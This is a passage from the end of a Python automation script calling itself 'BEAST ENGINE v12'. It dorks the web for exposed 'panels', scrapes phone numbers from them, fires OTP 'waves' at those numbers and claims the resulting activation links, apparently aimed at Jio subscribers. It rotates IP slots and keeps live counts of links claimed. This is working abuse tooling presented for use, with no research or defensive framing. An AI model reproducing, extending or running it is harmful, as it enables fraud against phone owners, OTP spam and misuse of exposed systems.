                print(f"[LIFECYCLE] 🗃️  Archived exhausted panel: {panel_url.split('//')[-1].split('.')[0][:30]}")
            continue

        _inc("panels_live")
        _inc("numbers_found", len(num_list))
        _panel_lifecycle.record_wave(panel_url, len(num_list))
        _pscores.record_hit(panel_url)

        print(f"\n[SCANNER] ✅ {panel_url.split('//')[-1].split('.')[0][:30]} → {len(num_list)} numbers found")

        # Process in wave batches
        numbers_triples = [(item[0], item[1], item[2] if len(item) > 2 else "") for item in num_list]

        panel_claimed_this_visit = 0
        for batch_start in range(0, len(numbers_triples), WAVE_BATCH_SIZE):
            batch = numbers_triples[batch_start:batch_start + WAVE_BATCH_SIZE]
            wave_num = await _next_wave_num()
            summary = await run_wave(session, connector, panel_url, panel_key, batch, wave_num)
            await _wave_logger.flush_now()
            panel_claimed_this_visit += summary.get("claimed", 0) if isinstance(summary, dict) else 0

            # Brief pause between waves on same panel
            await asyncio.sleep(0.5)

        # Update claim cooldown streak
        if panel_claimed_this_visit == 0:
            streak = _panel_zero_claim_streak.get(panel_url, 0) + 1
            _panel_zero_claim_streak[panel_url] = streak
            if streak >= _PANEL_COOLDOWN_THRESHOLD:
                _panel_claim_cooldown[panel_url] = time.time() + _PANEL_COOLDOWN_SECS
                _panel_zero_claim_streak[panel_url] = 0
                short_name = panel_url.split("//")[-1].split(".")[0][:30]
                print(f"[COOLDOWN] 🥶 Panel {short_name} rested 20m (0 claims for {streak} waves)")
        else:
            # Reset streak when we get claims
            _panel_zero_claim_streak[panel_url] = 0
            _panel_claim_cooldown.pop(panel_url, None)

# ==================== DORKER LOOP ====================
_dorker_probed_urls: set[str] = set()

async def dorker_loop(session: aiohttp.ClientSession, panel_queue: asyncio.Queue, dorker_sem: asyncio.Semaphore):
    _dcfg = _CFG.get("dorker", {})
    batch_size = int(_dcfg.get("batch_size", 50))
    sleep_sec = float(_dcfg.get("loop_sleep_seconds", 15))
    consecutive_empty = 0

    while True:
        try:
            candidates = generate_candidates(batch_size, _dorker_probed_urls, _dead_panels | _exhausted_panels)
            if not candidates:
                consecutive_empty += 1
                await asyncio.sleep(min(sleep_sec * consecutive_empty, 60))
                continue
            consecutive_empty = 0

            tasks = [dorker_check(session, url, dorker_sem) for url in candidates]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            new_found = 0
            for result in results:
                if isinstance(result, str) and result:
                    if result not in _seen_panels and result not in _dead_panels:
                        _seen_panels.add(result)
                        await panel_queue.put((result, ""))
                        new_found += 1
                        _inc("panels_discovered")
                        try:
                            async with aiofiles.open(DISCOVERED_FILE, "a", encoding="utf-8") as f:
                                await f.write(f"{result}||\n")
                        except Exception:
                            pass
            if new_found:
                print(f"[DORKER] 🔍 Found {new_found} new panels! Total in queue: ~{panel_queue.qsize()}")
        except Exception:
            pass

        await asyncio.sleep(sleep_sec)

# ==================== PANEL RECYCLER ====================
async def panel_recycler_loop(panel_queue: asyncio.Queue):
    """Re-queues top-scored panels to keep the wave beast always fed."""
    while True:
        await asyncio.sleep(30)
        try:
            if panel_queue.qsize() < 50:
                seeds = load_seed_panels()
                sorted_seeds = _pscores.sorted_panels(seeds)
                added = 0
                now = time.time()

                # Phase 1: Re-queue available panels not in cooldown or dead/exhausted
                for u, k in sorted_seeds:
                    if u in _exhausted_panels or u in _dead_panels:
                        continue
                    if now < _panel_claim_cooldown.get(u, 0):
                        continue
                    try:
                        panel_queue.put_nowait((u, k))
                        added += 1
                        if added >= 50:
                            break
                    except asyncio.QueueFull:
                        break

                # Phase 2: Anti-starvation fallback — if queue is still empty, release oldest cooled-down panels
                if added == 0 and panel_queue.qsize() == 0 and sorted_seeds:
                    cooled = [(u, k, _panel_claim_cooldown.get(u, 0)) for u, k in sorted_seeds
                              if u not in _exhausted_panels and u not in _dead_panels]
                    if cooled:
                        cooled.sort(key=lambda x: x[2])  # oldest cooldown first
                        for u, k, _ in cooled[:10]:
                            _panel_claim_cooldown.pop(u, None)  # release early
                            try:
                                panel_queue.put_nowait((u, k))
                                added += 1
                            except asyncio.QueueFull:
                                break

                if added:
                    print(f"[RECYCLER] ♻️  Re-queued {added} panels (queue was low)")
        except Exception:
            pass

# ==================== DASHBOARD ====================
async def dashboard_loop():
    while True:
        await asyncio.sleep(4.0)
        elapsed = time.time() - _stats["start_time"]
        h = int(elapsed // 3600)
        m = int((elapsed % 3600) // 60)
        s = int(elapsed % 60)
        wave_info = _stats.get("current_wave", "—")
        print(
            f"[{h}:{m:02d}:{s:02d}] "
            f"Waves:{_stats.get('waves_run',0)} | "
            f"Live Panels:{_stats.get('panels_live',0)} | "
            f"Exhausted:{_stats.get('panels_exhausted',0)} | "
            f"Nums:{_stats.get('numbers_found',0)} | "
            f"Sent:{_stats.get('otps_sent',0)} | "
            f"OTP✓:{_stats.get('otp_received',0)} | "
            f"Claimed:{_stats.get('links_claimed',0)} | "
            f"Not Jio:{_stats.get('not_jio',0)}"
        )
        if wave_info and wave_info != "—":
            print(f"         📡 {wave_info}")
        sys.stdout.flush()

# ==================== MAIN ====================
async def main():
    # Create output dirs
    WAVE_LOGS_DIR.mkdir(exist_ok=True)
    USED_PANELS_DIR.mkdir(exist_ok=True)

    _ip_manager.init_slots()
    load_state()

    seed_panels = load_seed_panels()

    print("\n======================================================================")
    print("  🔥 BEAST ENGINE v12 — NUCLEAR WAVE EDITION 🔥")
    print(f"  {_ip_manager.total_ips} IP Slots | Wave Size: {WAVE_BATCH_SIZE} | Wave Timeout: {WAVE_TIMEOUT:.0f}s")
    print(f"  Wave OTP Workers: {WAVE_OTP_WORKERS} | Scanner Workers: {SCANNER_WORKERS}")
    print(f"  Wave Logs: wave_logs/ | Archived Panels: used_panels/")
    print(f"  Outputs: {DESKTOP_ALL}")
    print(f"           {DESKTOP_FRESH}")
    print("======================================================================\n")

    print(f"[+] Loaded {len(seed_panels)} seed panels")
    print(f"[+] Known activation links: {len(_known_links)}")
    print(f"[+] IP slots: {_ip_manager.total_ips}")

    panel_queue: asyncio.Queue = asyncio.Queue(maxsize=20000)
    for u, k in seed_panels:
        await panel_queue.put((u, k))

    dorker_sem = asyncio.Semaphore(CONCURRENT_DORKER)

    connector = aiohttp.TCPConnector(
        limit=600, limit_per_host=100, ttl_dns_cache=300,
        enable_cleanup_closed=True
    )
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []

        # Wave Beast (multiple parallel wave runners)
        WAVE_RUNNERS = 3  # 3 parallel wave runners = process 3 panels simultaneously
        for i in range(WAVE_RUNNERS):
            tasks.append(asyncio.create_task(
                wave_beast_loop(session, connector, panel_queue)
            ))

        # Dorker (background panel discovery)
        tasks.append(asyncio.create_task(dorker_loop(session, panel_queue, dorker_sem)))

        # Panel Recycler
        tasks.append(asyncio.create_task(panel_recycler_loop(panel_queue)))

        # Dashboard
        tasks.append(asyncio.create_task(dashboard_loop()))

        print(f"[+] Launched {len(tasks)} coroutines: {WAVE_RUNNERS} wave runners + dorker + recycler + dashboard")
        print(f"[+] Wave logs will be written to: wave_logs/")
        print()

        await asyncio.gather(*tasks, return_exceptions=True)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Wave Beast stopped by user.")
